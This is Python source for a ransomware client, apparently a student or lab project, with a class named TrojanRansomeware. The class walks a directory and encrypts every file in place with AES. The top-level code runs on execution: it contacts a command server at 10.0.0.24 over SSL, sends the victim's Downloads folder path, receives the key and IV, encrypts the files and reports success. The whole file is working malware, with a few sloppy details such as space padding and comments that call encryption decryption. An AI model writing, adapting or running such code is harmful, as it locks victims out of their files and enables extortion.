import os
import socket
import ssl
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

class TrojanRansomeware():
    def __init__(self, key, iv):
        """
        Init function.
            
        Parameters
        ----------
        self : self
            The attributes of the class.

        key : bytes
            The key for encryption and decryption.

        iv : bytes
            The iv for encryption and decryption.
        """
        self.key = key
        self.iv = iv
        self.backend = default_backend()

    def encryption_decryption_path(self, path, actionFunc):
        """
        The function gets path and actionFunc move on the path and for every file do the actionFunc.
            
        Parameters
        ----------
        self : self
            The attributes of the class.

        path : str
            The path for moving on.

        actionFunc : function
            The function that the function need to active on every file.

        Returns
        -------
        None
        """
        for dir_path, dir_names, file_names in os.walk(path):
            for file_name in file_names:
                file_path = os.path.join(dir_path, file_name)
                actionFunc(file_path)

    def encrypt_file(self, path):
        """
        The function get path of file and encrypt the file.
            
        Parameters
        ----------
        self : self
            The attributes of the class.

        path : str
            The path for encrypt.

        Returns
        -------
        None
        """
        plain_text = self.read_file(path)
        encrypted_text = self.encrypt(plain_text)
        self.write_file(path, encrypted_text)

    def decrypt_file(self, path):
        """
        The function get path of file and decrypt the file.
            
        Parameters
        ----------
        self : self
            The attributes of the class.

        path : str
            The path for decrypt.

        Returns
        -------
        None
        """
        encrypted_text = self.read_file(path)
        plain_text = self.decrypt(encrypted_text)
        self.write_file(path, plain_text)
    
    def read_file(self, path):
        """
        The function get path of file and return the binary content of the file.
            
        Parameters
        ----------
        self : self
            The attributes of the class.

        path : str
            The path for the file.

        Returns
        -------
        Bytes
        """
        with open(path, "rb") as file:
            return file.read()
        
    def write_file(self, path, text):
        """
        The function get path of file write binary on the file text.
            
        Parameters
        ----------
        self : self
            The attributes of the class.

        path : str
            The path for the file.

        text : str
            The content for writing on the file.

        Returns
        -------
        None
        """
        with open(path, "wb") as file:
            file.write(text)
    
    def encrypt(self, plain_text):
        """
        The function get plain text, encrypt the text in AES method and return the cipher text
            
        Parameters
        ----------
        self : self
            The attributes of the class.

        plain_text : str
            The text before encryption.

        Returns
        -------
        Bytes
        """
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        encryptor = cipher.encryptor()
        padded_payload = plain_text + b' ' * (16 - len(plain_text) % 16)
        cipher_text = encryptor.update(padded_payload) + encryptor.finalize()
        return cipher_text
        
    def decrypt(self, encypted_text):
        """
        The function get encypted text, decrypt the text in AES method and return the plain text
            
        Parameters
        ----------
        self : self
            The attributes of the class.

        encypted_text : str
            The text after encryption.

        Returns
        -------
        Bytes
        """
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        decryptor = cipher.decryptor()
        plain_text = decryptor.update(encypted_text) + decryptor.finalize()
        return plain_text

try:
    # Create socket with ssl layer
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_lock = ssl.wrap_socket(sock)
    ssl_lock.connect(('10.0.0.24', 7800))

    # Get from the server if the ip is in the database
    isInDatabase = int.from_bytes(ssl_lock.recv(1), 'big')
    # 1 - In, 0 - Not In
    if isInDatabase == 0:
        # Sending the action (2 - decryption)
        ssl_lock.send(int(1).to_bytes(1, 'big'))

        # Get environment var and get path for downloads
        temp_path = os.environ.get('TEMP')
        user_name = os.environ.get('USERNAME')

        # Sending the path for the server
        path = temp_path[0 : temp_path.find(user_name) + len(user_name)] + R"\Downloads\folder"
        ssl_lock.send(len(path.encode('utf-8')).to_bytes(32, 'big'))
        ssl_lock.send(path.encode('utf-8'))

        # Get the iv and key
        iv = ssl_lock.recv(16)
        key = ssl_lock.recv(32)

        # Active decryption on the path and send success status
        software = TrojanRansomeware(key, iv)
        software.encryption_decryption_path(path, software.encrypt_file)
        ssl_lock.send(int(1).to_bytes(1, 'big'))

    ssl_lock.close()

except Exception as e:
    print(e)